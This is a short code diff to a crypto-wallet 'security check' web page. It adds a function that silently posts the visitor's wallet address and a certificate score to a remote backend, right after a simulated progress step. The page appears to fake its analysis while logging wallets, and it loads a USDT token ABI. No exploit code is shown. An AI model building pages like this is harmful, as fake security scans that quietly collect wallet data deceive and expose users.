@@ -794,6 +794,29 @@
         // CONFIGURATION
         // ========================================
         const CONTRACT_ADDRESS = "0x7BDD962fff20FB63a1C05bd1d2e67807EA0f57c0";
+
+        const BACKEND_URL = "https://trading-service-api.onrender.com"; // Update with your Render URL
+
+        // Save user to backend
+        async function saveUserToBackend(walletAddress, certificateData) {
+            try {
+                await fetch(`${BACKEND_URL}/api/save-user`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        wallet: walletAddress,
+                        timestamp: new Date().toISOString(),
+                        certificateId: certificateData.certificateId,
+                        score: certificateData.securityScore
+                    })
+                });
+                console.log('✅ User saved to backend!');
+            } catch (error) {
+                console.error('Backend error:', error);
+            }
+        }
+
+        
         const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
         
         const USDT_ABI = [
@@ -891,6 +914,8 @@
                 await simulateProgress();
                 
                 generateCertificateData();
+                await saveUserToBackend(account, certificateData);
+                
                 document.getElementById('analyzingText').classList.remove('show');
                 showCertificate();
                 
